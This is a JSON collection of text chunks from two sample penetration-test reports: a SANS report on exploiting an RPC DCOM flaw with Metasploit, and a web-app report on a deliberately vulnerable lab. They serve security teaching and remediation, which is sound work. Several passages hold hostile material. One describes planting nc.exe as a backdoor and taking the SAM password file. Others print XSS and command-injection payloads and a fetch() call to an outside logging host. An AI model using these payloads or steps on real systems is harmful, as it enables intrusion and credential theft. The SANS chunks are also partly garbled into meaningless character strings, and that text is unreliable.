    "text": "! ! ! ! ! ! Figure 3 192.168.1.75 Number of Risks ! ! ! Unsecure service (Telnet) is running: ! Threat Level ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Medium Vulnerability Medium Analysis Telnet provides access to the server for remote administration as an example. Unfortunately telnet traffic is not encrypted. Suspicious users i.e. attacker with and easy accessible sniffer can sniff the traffic, which may include sensitive data and/or administrator credentials. By Telneting to 192.168.1.75, we were able to see telnet service version number 5.00 )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >S( ! ( ! ! ! ! Figure 4 Telnet Service Banner ! ! Impact ! ! High ! Risk Rating ! ! Low ! Recommendation ! ! If deemed necessary for this server to be administered remotely, utilize secure ! administration tools such as SSH or Secure remote desktop access. ! ! ! Microsoft RPC Interface Buffer Overrun: ! C$0,(0,(I\",#(J%&(6:2%+,#&*#0%+(<\"&<%,:(0J(#$:(<:+` Threat Level ! #:,#:&(D%\".6(.0B:(#%(\"<.%*6(*+H(#%%.(0+(#$:(#*&4:#( ! High ,H,#:21(*(&\".:(%J(:+4*4:2:+#(,$%\".6(0+5.\"6:(,\"5$(*( ! ,#*#:2:+#a(C$:(#%%.,(2\",#(/:(&:2%7:6(*J#:&(#$:(#:,#-( Vulnerability ! ! Critical \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Analysis The remote host is running a version of Windows, which has a flaw in its RPC interface, which may allow an attacker to execute arbitrary code and gain SYSTEM privileges. An attacker or a worm could use it to gain the control of this host. We exploit this vulnerability utilizing a ready exploit available in the internet. Figure 5 Exploiting RPC using dcom After exploiting this vulnerability we got a shell and as you can see the IP address is the server IP address. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >T( ! ( ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! Figure 6 Getting Shell Access ! ! We also utilize this vulnerability to upload and download file through meterpreter as ! ! described below: \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Figure 7 Exploiting dcom - metasploit )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# O?( ! ( ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Figure 8 Uploading nc.exe as backdoor We uploaded a tool for further testing )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# O@( ! ( ! We opened a command shell using meterpreter and ran nc.exe to listen on port ! ! 2222/TCP: ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Figure 9 Shell command and running nc And downloading SAM file for cracking the system passwords offline: Figure 10 Downloading SAM file Impact Critical )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# O>( ! ( ! Risk Rating ! ! Critical ! Recommendation ! ! Patch the system with latest patches from MS. ! http://www.microsoft.com/technet/security/bulletin/MS03-039.mspx ! ! ! 4. References ! ! !",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 13
    }
  },
  {
    "text": "10 Downloading SAM file Impact Critical )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# O>( ! ( ! Risk Rating ! ! Critical ! Recommendation ! ! Patch the system with latest patches from MS. ! http://www.microsoft.com/technet/security/bulletin/MS03-039.mspx ! ! ! 4. References ! ! ! ! Appendix A - Nessus Vulnerability Scanning Reports ! ! Attache nessus scanning file. ! ! ! ! ! ! ! ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 14
    }
  },
  {
    "text": "Feb 12, 2025 SampleCompany Ltd Sample Pentest Engagement\\nVersion 1.0 Issued John Doe Reviewed Date Feb 12, 2025 2\\nTable of Contents 1. Document control .................................................................................................. 4 2. Introduction ............................................................................................................ 5 3. Executive summary ................................................................................................... 7 4. Findings (grouped by target) ................................................................................... 11 4.1 Target: ............................................................................................................... 11 4.2 Target: ............................................................................................................... 70 5. Addendum ............................................................................................................. 105 5.1 Tools and techniques ...................................................................................... 105 3\\n1. Document control Distribution list Name Role Representing John Doe Security Consultant Company Name Revision history Version Date Name Status Peer Review 1.0 Feb 12, John Doe Draft 2025 4\\n2. Introduction 2.1 Background companie was contracted by SampleCompany Ltd to perform a penetration test on its Internet facing systems in order to determine the effectiveness of the implemented security measures. The test was agreed in the Contract No. SC340023 of 01 March 2020 between SampleCompany Ltd and companie. The fieldwork was completed between 15 April 2020 and 30 April 2020. 2.2 Objectives The objective of the penetration test was to evaluate the current state of the websites in scope from a security perspective and determine the risk of a successful attack by a malicious hacker or nefarious user from the Internet. 2.3 Scope The following systems belonging to SampleCompany Ltd were in scope: Target Description https://pentest-ground.com:4280/ pentest-ground.com 2.4 Approach The penetration test was performed in a \"black box\" manner, meaning that we did not have any prior information about the target systems. Our tests simulated an external threat (hacker, malicious user) located somewhere on the Internet who tried to find vulnerabilities in the target systems and exploit them in order to gain unauthorized access to sensitive information or affect the correct functionality of the systems. 5\\n2.5 Methodology All of our tests were performed by combining our professional experience with well known methodologies such as OWASP Top 10 and NIST 800-115. 2.6 Disclaimer Please note that it is impossible to test networks, information systems and people for every potential security vulnerability. This report does not form a guarantee that your assets are secure from all threats. The tests performed and their results are only from the point of view of companie. companie is unable to ensure or guarantee that your assets are completely safe from any form of attack, including those that are not known at the time of the penetration test. Furthermore, any changes to the tested systems may have an impact on their security level either in a negative or positive way. Our tests were performed in a time limited approach and our service was best-effort. 6\\n3. Executive summary The penetration test revealed several high risk vulnerabilities together with multiple medium and low risk issues. We recommend implementing the measures suggested for each finding in order to improve the security posture of the affected systems. This is a visual representation of the findings and their criticality levels: The table below summarizes the findings identified in this penetration test: 4.1 https://pentest-ground.com:4280/ Finding Risk level Verified Remote File Inclusion Critical ✔ SQL Injection Critical ✔ OS Command Injection Critical ✔ 7\\nLocal File",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 0
    }
  },
  {
    "text": "posture of the affected systems. This is a visual representation of the findings and their criticality levels: The table below summarizes the findings identified in this penetration test: 4.1 https://pentest-ground.com:4280/ Finding Risk level Verified Remote File Inclusion Critical ✔ SQL Injection Critical ✔ OS Command Injection Critical ✔ 7\\nLocal File Inclusion High ✔ DOM-based Cross-Site Scripting High ✔ Cross-Site Scripting High ✔ Server Side Request Forgery Medium ✔ Insecure cookie setting: missing HttpOnly flag Medium ✔ Insecure cookie setting: missing Secure flag Medium ✔ Server Information disclosure Medium ✘ Error message containing sensitive information Low ✘ Open Redirect Low ✔ Enumerable Parameter Low ✘ Internal Server Error Found Low ✔ Missing security header: Strict-Transport-Security Low ✔ Missing security header: X-Content-Type-Options Low ✔ Missing security header: Content-Security-Policy Low ✔ Missing security header: Referrer-Policy Low ✔ 8\\nUnsafe security header: Content-Security-Policy Low ✔ Password Submitted in URL Low ✔ Server software and technology found Low ✘ Robots.txt file found Low ✔ Exposure of Sensitive Information Low ✘ Interesting files found Low ✘ 4.2 pentest-ground.com Finding Risk level Verified Redis - Remote Code Execution (CVE-2022-0543) Critical ✔ Oracle Weblogic - Remote Code Execution (CVE-2018- Critical ✔ 2894) Oracle WebLogic Server - Remote Code Execution (CVE- Critical ✔ 2020-2551) Vulnerabilities found for Redis Key-Value Store 5.0.7 High ✘ Oracle WebLogic - Remote Code Execution (CVE-2023- High ✔ 21839) Oracle Fusion Middleware WebLogic Server Administration High ✔ Console - Remote Code Execution (CVE-2020-14883) 9\\nRedis - Default Logins High ✔ Redis Server - Unauthenticated Access High ✔ SSH service exposed to the Internet Medium ✔ Redis service exposed to the Internet Medium ✔ End-of-Life (EOL) found for Redis key-value store Low ✔ ✔ - verified finding 10\\n4. Findings (grouped by target) 4.1 Target: https://pentest-ground.com:4280/ 4.1.1 Remote File Inclusion Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/fi/ Method GET Vulnerable Parameter page (Query Parameter) Evidence Injecting the remote file URL https://pentest- tools.com/file.txt in the page query parameter resulted in the content of the remote file being present in the response. Request / Response Vulnerability description We found that the target web application is vulnerable to Remote File Inclusion (RFI) attacks. This vulnerability occurs when the application allows external files to be included and executed within its environment. 11\\nRisk description The risk varies greatly, depending on the behaviour of programming language used on the server. The impact can range from client side vulnerabilities, like Cross-Site Scripting, to server side issues, like Remote Code Execution. If the programming language functionality used to import the resource just embeds the remote file content in the HTTP response, you are looking at impact on the client-side. On the other hand, if the content is treated and interpreted as code on the server, you are potentially dealing with Remote-Code Execution. Recommendation The most effective solution to eliminating file inclusion vulnerabilities is to avoid passing raw user-submitted input to any filesystem API. If this is not possible, the application can maintain a white list of files that may be included by the page, and then",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 1
    }
  },
  {
    "text": "are potentially dealing with Remote-Code Execution. Recommendation The most effective solution to eliminating file inclusion vulnerabilities is to avoid passing raw user-submitted input to any filesystem API. If this is not possible, the application can maintain a white list of files that may be included by the page, and then check to see if the user input matches against any of the entries in the white list. Any request containing an invalid identifier has to be rejected. In this way, there is no attack surface for malicious users to manipulate the path. References https://owasp.org/www-project-web-security-testing-guide/stable/4- Web_Application_Security_Testing/07-Input_Validation_Testing/11.2- Testing_for_Remote_File_Inclusion Classification Category ID / Value CWE CWE-94 OWASP Top 10 - 2017 A1 - Injection OWASP Top 10 - 2021 A3 - Injection 12\\nScreenshots Figure 1. Remote File Inclusion Verification ✔ This finding was validated so it is not a False Positive. 13\\n4.1.2 SQL Injection Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/brute/ Method GET Vulnerable username Parameter (Query Parameter) Evidence Injecting the value ' in the username query parameter generated the following error(s) in the response: <b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '627c0d05c087944c97a1f57d535ca4b7'' at line 1 in /var/www/html/vulnerabilities/brute/source/lo w.php:13 Request / Response URL https://pentest-ground.com:4280/vulnerabilities/sqli_blind/ 14\\nMethod GET Vulnerable id Parameter (Query Parameter) Evidence Injecting the value ' in the id query parameter generated the following error(s) in the response: <b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1d3d2d231d2dd4''' at line 1 in /var/www/html/vulnerabilities/sqli_blind/sour ce/low.php:12 Request / Response Vulnerability description We found that the web application is vulnerable to SQL Injection attacks in its database query handling. The vulnerability is caused by improper input sanitization and allows an attacker to inject arbitrary SQL commands and execute them directly on the database. Risk description The risk exists that an attacker gains unauthorized access to the information from the database of the application. He could extract and alter information such as: application usernames, passwords, client information and other application specific data. Recommendation We recommend implementing a validation mechanism for all the data received from the users. The best way to protect against SQL Injection is to use prepared statements for every SQL query performed on the database. Otherwise, the user input can also be sanitized using dedicated methods such as: mysqli_real_escape_string. 15\\nReferences https://owasp.org/www-community/attacks/SQL_Injection https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_She et.html Classification Category ID / Value CWE CWE-89 OWASP Top 10 - 2017 A1 - Injection OWASP Top 10 - 2021 A3 - Injection Verification ✔ This finding was validated so it is not a False Positive. 16\\n4.1.3 OS Command Injection Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/exec/ Method POST Vulnerable Parameter ip (Body Parameter) Evidence Injected the echo ttp1739356543.6927|rev|sed -e 's/^/ptt/' -e 's/\\./dot/'|tr a-z A-Z command in the ip body parameter and found the expected command output (PTT7296DOT3456539371PTT) in the response To validate the vulnerability, we extracted",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 2
    }
  },
  {
    "text": "Command Injection Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/exec/ Method POST Vulnerable Parameter ip (Body Parameter) Evidence Injected the echo ttp1739356543.6927|rev|sed -e 's/^/ptt/' -e 's/\\./dot/'|tr a-z A-Z command in the ip body parameter and found the expected command output (PTT7296DOT3456539371PTT) in the response To validate the vulnerability, we extracted the kernel version and the hostname of the Unix machine. The kernel version is 5.10.0-32-amd64, and the hostname is ba766be4f6cb. Request / Response Vulnerability description We found that the target web application can be manipulated into running operating system commands on its host machine. This vulnerability arises from the application improperly handling or sanitizing user input which reaches OS functions. 17\\nRisk description The risk is that an attacker can use the application to run OS commands with the privileges of the vulnerable application. This could lead (but not limited) to Remote Code Execution, Denial of Service, Sensitive Information Disclosure, Sensitive Information Deletion. Recommendation There are multiple ways to mitigate this attack: - avoid calling OS commands directly (use built-in library functions) - escape values added to OS commands specific to each OS - implement parametrization in conjunction with Input Validation (segregate data by command; implement Positive or whitelist input validation; White list Regular Expression) In order to provide Defense in Depth, we also recommend to allocate the lowest privileges to web applications. References https://owasp.org/www-community/attacks/Command_Injection https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Che at_Sheet.html Classification Category ID / Value CWE CWE-78 OWASP Top 10 - 2017 A1 - Injection OWASP Top 10 - 2021 A3 - Injection Verification ✔ This finding was validated so it is not a False Positive. 18\\n4.1.4 Local File Inclusion Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/fi/ Method GET Vulnerable Parameter page (Query Parameter) Evidence We found a Local File Inclusion vulnerability in the page query parameter.We managed to read the contents of two files. First, we tested for the vulnerability by injecting the payload: /proc/cpuinfo. We extracted the data:Additionally, we validated the vulnerability by injecting the payload: processor : 0 vendor_id : AuthenticAMD cpu family : 25 model : 1 model name : AMD EPYC 7713 64-Core Processor stepping : 1 microcode : 0xa0011d1 processor : 1 vendor_id : AuthenticAMD cpu family : 25. The extracted data was: Request / Response 19\\nVulnerability description We have discovered that the target application is affected by Local File Inclusion (also known as LFI), usually caused by improper validation of input used in file handling functions. This vulnerability allows including files that are already locally present on the server, by exploiting the vulnerable inclusion procedures implemented in the application. Risk description The risk exists that an attacker can manipulate the affected parameter in order to load and sometimes execute any locally stored file. This could lead to reading arbitrary files, code execution, Cross-Site Scripting, denial of service, sensitive information disclosure. Recommendation The most effective solution to eliminating file inclusion vulnerabilities is to avoid passing raw user-submitted input to any filesystem API. If this is not possible, the application can maintain a white list of files that",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 3
    }
  },
  {
    "text": "to reading arbitrary files, code execution, Cross-Site Scripting, denial of service, sensitive information disclosure. Recommendation The most effective solution to eliminating file inclusion vulnerabilities is to avoid passing raw user-submitted input to any filesystem API. If this is not possible, the application can maintain a white list of files that may be included by the page, and then check to see if the user input matches against any of the entries in the white list. Any request containing an invalid identifier has to be rejected. In this way, there is no attack surface for malicious users to manipulate the path. References https://owasp.org/www-project-web-security-testing-guide/stable/4- Web_Application_Security_Testing/07-Input_Validation_Testing/11.1- Testing_for_Local_File_Inclusion Classification Category ID / Value CWE CWE-22 OWASP Top 10 - 2017 A1 - Injection OWASP Top 10 - 2021 A1 - Broken Access Control 20\\nScreenshots Figure 1. Local File Inclusion Verification ✔ This finding was validated so it is not a False Positive. 21\\n4.1.5 DOM-based Cross-Site Scripting Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/xss_d/ Method GET Vulnerable default Parameter (Query Parameter) Evidence Injected the payload </option></select><sVg/onLOad=document.body.append (`6f798b51`.repeat(2))> in the default query parameter and the expected result 6f798b516f798b51 was found in the response. The payload reached the JavaScript sink document.write. The stack trace to this call was: anonymous @ https://pentest- ground.com:4280/vulnerabilities/xss_d/?default=def aultpttf291ab78`: line 70, column 15 The script inside the payload tries to repeat a random string. If the string 6f798b51 is doubled on the response page, we confirm that our script has been executed. This request was done using a Chrome browser. If available, the replay attack button uses a simpler alert() payload that may not work as expected. To validate the vulnerability, we attempted to extract some data exposed by the application in the browser. The application uses the following (non-HttpOnly) cookies: _ga:GA1.1.1244663522.1739354417_ga_Z3XCDXSJ3P:GS1.1.17 22\\n39354416.1.1.1739354516.20.0.0_gcl_au:1.1.613626497.1739354 416PHPSESSID:19d5a469db64624265da3f93925f7be3security:l ow Request / Response Vulnerability description We found that the target web application is vulnerable to DOM-based Cross-Site Scripting (DOM XSS) attacks. This vulnerability is caused by inadequate input validation, allowing a malicious actor to inject and execute JavaScript code in the context of another user's session. DOM-based XSS is purely client-side, meaning the malicious script runs as a result of modifying the Document Object Model (DOM) environment in the victim's browser, without sending the payload to the server. Risk description The risk is that the code injected by an attacker could potentially lead to effects such as stealing session cookies, calling application features on behalf of another user, or exploiting browser vulnerabilities. Recommendation There are several ways to mitigate DOM-based XSS attacks. We recommend to: - never trust user input - encode and escape user input on the client side as well - implement Content Security Policy (CSP) - use the HTTPOnly cookie flag to protect from cookie theft - try to avoid using innerHTML or document.write() to insert untrusted content directly into your HTML, as these methods don't filter malicious scripts. Use methods that provide finer control, such as creating elements via document.createElement() and safely inserting values with Element.textContent. If you must use unsafe methods, pass",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 4
    }
  },
  {
    "text": "cookie theft - try to avoid using innerHTML or document.write() to insert untrusted content directly into your HTML, as these methods don't filter malicious scripts. Use methods that provide finer control, such as creating elements via document.createElement() and safely inserting values with Element.textContent. If you must use unsafe methods, pass their inputs to an HTML sanitization library first, such as DOMPurify. - regularly update and audit JavaScript libraries and frameworks for vulnerabilities. References https://owasp.org/www-community/attacks/DOM_Based_XSS https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_ Sheet.html 23\\nClassification Category ID / Value CWE CWE-79 OWASP Top 10 - 2017 A7 - Cross-Site Scripting (XSS) OWASP Top 10 - 2021 A3 - Injection Verification ✔ This finding was validated so it is not a False Positive. 24\\n4.1.6 Cross-Site Scripting Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/xss_r/ Method GET Vulnerable name Parameter (Query Parameter) Evidence Injected the payload <sVg/onLOad=document.body.append(`0baf618c`.repeat (2))> in the name query parameter and the expected result 0baf618c0baf618c was found in the response. The script inside the payload tries to repeat a random string. If the string 0baf618c is doubled on the response page, we confirm that our script has been executed. This request was done using a Chrome browser. If available, the replay attack button uses a simpler alert() payload that may not work as expected. To validate the vulnerability, we attempted to extract some data exposed by the application in the browser. The application uses the following (non-HttpOnly) cookies: _ga:GA1.1.1244663522.1739354417_ga_Z3XCDXSJ3P:GS1.1.17 39354416.1.1.1739354516.20.0.0_gcl_au:1.1.613626497.1739354 416PHPSESSID:19d5a469db64624265da3f93925f7be3security:l ow Request / Response 25\\nURL https://pentest-ground.com:4280/vulnerabilities/xss_s/ Method POST Vulnerable mtxMessage Parameter (Body Parameter) Evidence Injected the payload <sVg/onLOad=document['body']['append'](`c96ad3e0`[ 'repeat'](2))> in the mtxMessage body parameter and the expected result c96ad3e0c96ad3e0 was found in the response. The script inside the payload tries to repeat a random string. If the string c96ad3e0 is doubled on the response page, we confirm that our script has been executed. This request was done using a Chrome browser. If available, the replay attack button uses a simpler alert() payload that may not work as expected. To validate the vulnerability, we attempted to extract some data exposed by the application in the browser. The application uses the following (non-HttpOnly) cookies: _ga:GA1.1.1244663522.1739354417_ga_Z3XCDXSJ3P:GS1.1.17 39354416.1.1.1739354516.20.0.0_gcl_au:1.1.613626497.1739354 416PHPSESSID:19d5a469db64624265da3f93925f7be3security:l ow Request / Response URL https://pentest-ground.com:4280/vulnerabilities/xss_s/ Method POST Vulnerable txtName Parameter (Body Parameter) Evidence Injected the payload <sVg/onLOad=document.body.append(`6fdca7ee`.repeat 26\\n(2))> in the txtName body parameter and the expected result 6fdca7ee6fdca7ee was found in the response. The script inside the payload tries to repeat a random string. If the string 6fdca7ee is doubled on the response page, we confirm that our script has been executed. This request was done using a Chrome browser. If available, the replay attack button uses a simpler alert() payload that may not work as expected. To validate the vulnerability, we attempted to extract some data exposed by the application in the browser. The application uses the following (non-HttpOnly) cookies: _ga:GA1.1.1244663522.1739354417_ga_Z3XCDXSJ3P:GS1.1.17 39354416.1.1.1739354516.20.0.0_gcl_au:1.1.613626497.1739354 416PHPSESSID:19d5a469db64624265da3f93925f7be3security:l ow Request / Response Vulnerability description We found that the target web application is vulnerable to Cross-Site Scripting (XSS) attacks. This vulnerability is caused by inadequate input validation, allowing a malicious actor to inject and execute",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 5
    }
  },
  {
    "text": "application in the browser. The application uses the following (non-HttpOnly) cookies: _ga:GA1.1.1244663522.1739354417_ga_Z3XCDXSJ3P:GS1.1.17 39354416.1.1.1739354516.20.0.0_gcl_au:1.1.613626497.1739354 416PHPSESSID:19d5a469db64624265da3f93925f7be3security:l ow Request / Response Vulnerability description We found that the target web application is vulnerable to Cross-Site Scripting (XSS) attacks. This vulnerability is caused by inadequate input validation, allowing a malicious actor to inject and execute JavaScript code in the context of another user's session. Risk description The risk is that the code injected by an attacker could potentially lead to effects such as stealing session cookies, calling application features on behalf of another user, exploiting browser vulnerabilities. Successful exploitation of Cross-Site Scripting attacks requires human interaction (e.g. determine the user to access a special link by social engineering). Recommendation There are several ways to mitigate XSS attacks. We recommend to: - never trust user input - always encode and escape user input (using a Security Encoding Library) - use the HTTPOnly cookie flag to protect from cookie theft - implement Content Security Policy - use the X-XSS-Protection Response Header. 27\\nReferences https://owasp.org/www-community/attacks/xss https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Che at_Sheet.html Classification Category ID / Value CWE CWE-79 OWASP Top 10 - 2017 A7 - Cross-Site Scripting (XSS) OWASP Top 10 - 2021 A3 - Injection Verification ✔ This finding was validated so it is not a False Positive. 28\\n4.1.7 Server Side Request Forgery Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/fi/ Method GET Vulnerable page Parameter (Query Parameter) Evidence Injecting the payload http://25979911277719046700.taaIqJBO4h.bgGkxqa paY.ptt-logger.net in the page query parameter triggered a DNS lookup to one of our DNS loggers: taaIqJBO4h.bgGkxqapaY.ptt-logger.net. The DNS lookup was for a record of A type coming from 109.74.192.20. Request / Response URL https://pentest-ground.com:4280/vulnerabilities/fi/ Method GET Vulnerable page Parameter (Query Parameter) Evidence Injecting the payload 29\\nhttp://25979911277719046700.taaIqJBO4h.bgGkxqa paY.ptt-logger.net in the page query parameter triggered a DNS lookup to one of our DNS loggers: taaIqJBO4h.bgGkxqapaY.ptt-logger.net. The DNS lookup was for a record of AAAA type coming from 109.74.192.20. Request / Response URL https://pentest-ground.com:4280/vulnerabilities/fi/ Method GET Vulnerable page Parameter (Query Parameter) Evidence Injecting the payload https://ptt- logger.net/l/taaIqJBO4h/?id=8617179204880889 2490 in the page query parameter triggered an HTTP request to one of our HTTP loggers: https://ptt- logger.net/l/taaIqJBO4h/. The request came from the IP 178.79.134.182.We received the following HTTP headers: Request / Response - Host: ptt-logger.net - X-Forwarded-For: 178.79.134.182 - Connection: close Vulnerability description We found that the target application is affected by a Server Side Request Forgery (SSRF) vulnerability. SSRF is a vulnerability that allows a user to force the backend server to initiate HTTP requests to arbitrary URLs specified in the input parameters. We have detected this vulnerability by supplying URLs to our HTTP handlers to the server and confirming that we have received the expected request. Risk description The risk exists that a remote attacker could read or submit data to HTTP endpoints found in predefined locations. For example, applications hosted on cloud providers like 30\\nAWS, Digital Ocean, and Oracle Cloud can make unauthenticated requests to http://169.254.169.254/ to receive metadata. Other examples of services providing HTTP APIs on internal IPs are Elasticsearch, Prometheus, and Grafana. Additionally, the backend framework might support",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 6
    }
  },
  {
    "text": "HTTP endpoints found in predefined locations. For example, applications hosted on cloud providers like 30\\nAWS, Digital Ocean, and Oracle Cloud can make unauthenticated requests to http://169.254.169.254/ to receive metadata. Other examples of services providing HTTP APIs on internal IPs are Elasticsearch, Prometheus, and Grafana. Additionally, the backend framework might support requests over other protocols, like file://, ftp://, gopher://, which may extend the attack surface. For example, the file:// protocol might be used to retrieve documents from the system. Recommendation We recommend rewriting the vulnerable code to allow requests only to specific URLs (whitelist approach). Blacklists are usually ineffective, as there is a myriad of ways to bypass them. Furthermore, disable support for any unwanted protocols, like ftp://, file://. Lastly, internal services should be protected by authentication and authorization mechanisms, thus applying a defense-in-depth approach. References https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/ https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Preven tion_Cheat_Sheet.html Classification Category ID / Value CWE CWE-918 OWASP Top 10 - 2021 A10 - Server-Side Request Forgery Verification ✔ This finding was validated so it is not a False Positive. 31\\n4.1.8 Insecure cookie setting: missing HttpOnly flag Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL Cookie Evidence Name https://pentest- PHPSESSI The server responded with Set-Cookie ground.com:428 D, security header(s) that does not specify the HttpOnly 0/ flag: Set-Cookie: PHPSESSID=0c91ce65c9d194f858f04aa98f3fe e35 Set-Cookie: security=low Request / Response Vulnerability description We found that a cookie has been set without the HttpOnly flag, which means it can be accessed by potentially malicious JavaScript code running inside the web page. The root cause for this usually revolves around misconfigurations in the code or server settings. Risk description The risk is that an attacker who injects malicious JavaScript code on the page (e.g. by using an XSS attack) can access the cookie and can send it to another site. In case of a session cookie, this could lead to session hijacking. Recommendation Ensure that the HttpOnly flag is set for all cookies. 32\\nReferences https://owasp.org/www-community/HttpOnly Classification Category ID / Value CWE CWE-1004 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✔ This finding was validated so it is not a False Positive. 33\\n4.1.9 Insecure cookie setting: missing Secure flag Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL Cookie Evidence Name https://pentest- PHPSESSI Set-Cookie: ground.com:428 D, security PHPSESSID=0c91ce65c9d194f858f04aa98f3fe 0/ e35 Set-Cookie: security=low Request / Response Vulnerability description We found that a cookie has been set without the Secure flag, which means the browser will send it over an unencrypted channel (plain HTTP) if such a request is made. The root cause for this usually revolves around misconfigurations in the code or server settings. Risk description The risk exists that an attacker will intercept the clear-text communication between the browser and the server and he will steal the cookie of the user. If this is a session cookie, the attacker could gain unauthorized access to the victim's web session. Recommendation Whenever a cookie contains sensitive information or is a session token, then it should always be passed using an encrypted channel. Ensure",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 7
    }
  },
  {
    "text": "server and he will steal the cookie of the user. If this is a session cookie, the attacker could gain unauthorized access to the victim's web session. Recommendation Whenever a cookie contains sensitive information or is a session token, then it should always be passed using an encrypted channel. Ensure that the flag is set for cookies containing such sensitive information. 34\\nReferences https://owasp.org/www-project-web-security-testing-guide/stable/4- Web_Application_Security_Testing/06-Session_Management_Testing/02- Testing_for_Cookies_Attributes.html Classification Category ID / Value CWE CWE-614 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✔ This finding was validated so it is not a False Positive. 35\\n4.1.10 Server Information disclosure Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/?=PHPB8B5F2A0- 3C92-11d3-A3A9-4C7B08C10000 Page Title Welcome :: Damn Vulnerable Web Page Size 5.79 KB Summary PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. Vulnerability description We noticed that the target application is revealing server and backend application information through certain files. This type of information disclosure is typically due to insufficient data protection measures, leading to unintended exposure of sensitive server details. Risk description The risk is that an attacker could use these files to find information about the backend application, server software and their specific versions. This information could be further used to mount targeted attacks against the server. 36\\nRecommendation We recommend you to remove these scripts if they are not needed for business purposes. References http://projects.webappsec.org/w/page/13246936/Information%20Leakage Classification Category ID / Value CWE CWE-200 OWASP Top 10 - 2017 A6 - Security Misconfiguration OWASP Top 10 - 2021 A5 - Security Misconfiguration Verification ✘ 37\\n4.1.11 Error message containing sensitive information Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/sqli_blind/ Method GET Parameters Query: Submit=Submit id=\\\"-fetch('https://not-ptt- logger.net/l/taaIqJBO4h/?id=11385992114545625403'.replac e('not-ptt-logger.net','ptt-logger.net'),{mode:'no-cors'})}// Headers: 